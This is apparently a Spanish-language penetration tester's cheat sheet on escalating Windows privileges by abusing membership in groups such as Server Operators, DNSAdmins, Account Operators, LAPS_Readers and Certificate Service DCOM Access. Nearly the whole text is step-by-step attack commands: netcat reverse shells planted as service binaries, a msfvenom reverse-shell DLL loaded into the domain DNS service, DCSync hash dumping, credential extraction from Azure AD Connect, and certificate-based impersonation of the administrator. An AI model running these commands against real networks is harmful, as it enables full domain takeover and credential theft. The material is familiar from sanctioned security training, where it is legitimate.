# Grupos Especiales 

Tags: #Windows #PrivEsc #GruposExpeciales 

## Grupos Windows para escalar 

```bash 
❯ net user <user>     # Mirar los grupos del usuario 
	# <user> = Nombre del usuario actual 
```


## Azure Admins
```powershell
Si puedes acceder a Azure AD Connect desde un usuario del grupo 'Azure Admins', puedes extraer credenciales privilegiadas y 'escalar a Domain Admin'.


Pasos: 
❯ https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0   # Descargar el archivo AdDecrypt.zip y extraer su contenido para obtener 'AdDecrypt.exe, mcrypt.dll' y transferir los archivos a la máquina Windows comprometida
❯ 'C:\Program Files\Microsoft Azure AD Sync\Bin'  # Ir a la siguiente ruta en Windows para ejecutar el 'AdDecrypt.exe'
❯ AdDecrypt.exe -FullSQL      # Ejecutar la herramienta para extraer credenciales del usuario Administrator 

Notas: 
	1. El AdDecrypt.exe y mcrypt.dll se deben de encontrar en la misma carpeta
```

## Server Operators
```powershell 
Si pertenece a este grupo en un sistema Windows, se tiene ciertos privilegios elevados 'localmente' sobre los servidores y se puede 'iniciar, detener, configurar, crear, reiniciar realizar backups' sobre los servicios existentes.


Pasos:
	- Subir al directorio 'C:\Temp' del server el 'nc64.exe'
❯ services   # Mirar todos los servicios que se estan ejecutando en Windows 
❯ sc.exe create <service> binPath="C:\Temp\nc64.exe -e cmd IP_Kali 443"   # Crear un servicio 
❯ sc.exe create <service> binPath= "cmd.exe /c start /b C:\Temp\nc64.exe -e cmd IP_Kali 443"  <- MEJOR 

❯ sc.exe config <service> binPath="C:\Temp\nc64.exe -e cmd IP_Kali 443"   # Modificar un servicio 
❯ sc.exe config <service> binPath= "cmd.exe /c start /b C:\Temp\nc64.exe -e cmd IP_Kali 443"  <- MEJOR 
	# AmazonSSMAgent 
	# AWSLiteAgent 
	# cfn-hup   = Servicio recomendado modificar 

❯ sc.exe stop <service>         # Detener un servicio 
❯ sc.exe start <service>        # Iniciar un servicio 

Notas:
	1. Antes de iniciar el servicio, en Kali se debe de estar en 'listening' con 'Netcat' para establecer la Revershell 
```

## LAPS_Readers
```powershell 
Los miembros del grupo 'LAPS\Readers' tienen 'permiso de lectura' sobre los atributos de Active Directory donde se almacenan las 'contraseñas locales administradas automáticamente'. Por lo tanto, se puede leer la contraseña del administrador local de las máquinas unidas al dominio, conectarte con esa contraseña y tomar el control de la máquina como 'administrador local'.

# Descargar la tool 
https://github.com/kfosaaen/Get-LAPSPasswords

Paso 1:
❯ Import-Module .\Get-LAPSPasswords.ps1   # Importar el módulo 

Paso 2:
❯ Get-LAPSPasswords    # Ejecutar la función para obtener la password de Administrator
```

## Account Operators
```powershell
Si se esta en este grupo con derechos de 'GenericAll' sobre el grupo 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si el grupo de 'Exchange Windows Permissions' tiene derechos de 'WriteDacl' sobre el dominio, se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash


Paso 1:
❯ net user omar 'P@$$w0rd123!' /add /domain     # Crear un usuario a nivel de dominio  
❯ net group "Exchange Windows Permissions" omar /add    # Agregar al usuario al grupo 'Exchange Windows Permissions'
❯ net user omar    # Mirar que el usar este en el grupo 

Paso 2:
# Agregar el privilegio de DCSync al usuario  
❯ $SecPassword = ConvertTo-SecureString 'P@$$w0rd123!' -AsPlainText -Force
	# password = Contraseña del usuario creado 

Paso 3:
❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
	# user = Usuario creado (omar)
	# domain1.local = Dominio 

Paso 4: Instalar 'PowerView.ps1' para poder ejecutar este comando 
❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity <user> -Rights DCSync 
	# user = Usuario que se agrego en la variable $Cred (omar)

Paso 5:
# Hacer DCSync en Kali 
❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
	# IP-DC = La dirección IP del DC
```

## DNSAdmins - PrivEsc
```bash 
Los miembros pueden cargar una DLL arbitraria en el servicio DNS que corre como 'SYSTEM' en el DC.

Paso 1: Generar la DLL maliciosa
# Reverse shell
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f dll -o evil.dll

# O solo agregar usuario admin
❯ msfvenom -p windows/x64/exec CMD="net localgroup administrators tuusuario /add" -f dll -o evil.dll

Paso 2: Compartir la DLL desde Kali
❯ impacket-smbserver smbFolder $(pwd) -smb2support

Paso 3: Cargar la DDL en el servicio DNS del server víctima
❯ dnscmd.exe <DC01> /config /serverlevelplugindll \\IP_Kali\smbFolder\evil.dll
	# DC01 = Es el nombre del DC y sale con nxc 

Paso 4: Listener en Kali
❯ rlwrap nc -nlcp 4444

Paso 5: Reiniciar el servicio 
❯ sc.exe stop dns 
❯ sc.exe start dns

NOTA:
	- Si no funciona a la primera hacerlo varias veces 
```

## Certificate Service DCOM Access
```powershell 
Acceso remoto vía DCOM al servicio de Certificate Authority (CA).  
Esto significa que los usuarios de ese grupo pueden interactuar con la CA de forma remota (por ejemplo, para solicitar certificados). Además, debe de existir una plantilla vulnerable en la 'CA' como: 'Enrollee supplies subject, client authentication (OID)' y no tener restricciones de grupo


Pasos:
# Enumerar con Kali el 'AD CS' para ver si hay vulnerabilidades
❯ certipy find -ns IP -u 'user' -p 'password' -dc-ip IP -target IP   
	# IP = Es la dirección IP del DC
	❯ cat file_certipy.txt | grep Vuln -C 50      # Mirar las 50 lineas donde existe la vulnerabilidad con el CA y el template 

❯ certipy req -username user@domain.corp -password passwd -target-ip IP -ca 'CA' -template 'template_name' -upn 'administrator@domain.corp'        # Solicitar con Kali el certificado del usuario 'Administrator'
	# ca = Es el 'Certificate Authorities' y se encuentra en el archivo enumerado anteriormente 
	# template = Es la plantilla vulnerable y se encuentra en el archivo enumerado anteriormente
	# upn = El usuario al que queremos suplantar 
	# user = Es el usuario que se encuentra en el grupo 'Certificate Service DCOM Access' 
	
❯ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.corp' -dc-ip IP  # Solicitar con Kali el TGT  del usuario 'administrator' con el certificado 'PFX' y obtener el hash NTLM  

❯ impacket-wmiexec domain.corp/administrator@IP -no-pass -hashes 'LM:NT'    # Ingresar a Windows desde Kali con el usuario administrator 


Notas:
	1. Sincronizar Kali con el DC 
		❯ ntpdate IP_DC
	2. Al solicitar el certificado se debe de mostrar lo siguiente: 'Saved certificate and private key to administrator.pfx'
```